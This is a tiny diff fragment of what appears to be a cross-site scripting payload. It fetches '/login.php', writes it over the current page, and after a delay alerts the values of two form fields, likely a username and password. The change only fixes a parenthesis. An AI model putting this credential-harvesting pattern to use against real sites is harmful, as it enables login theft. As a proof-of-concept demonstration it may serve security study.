@@ -25,4 +25,4 @@ async () => document.write(await fetch('/login.php').then(page => page.text() + 
     alert(c[0].value + c[1].value)
   }), 4000)
 </script>
-`)()
+`))()
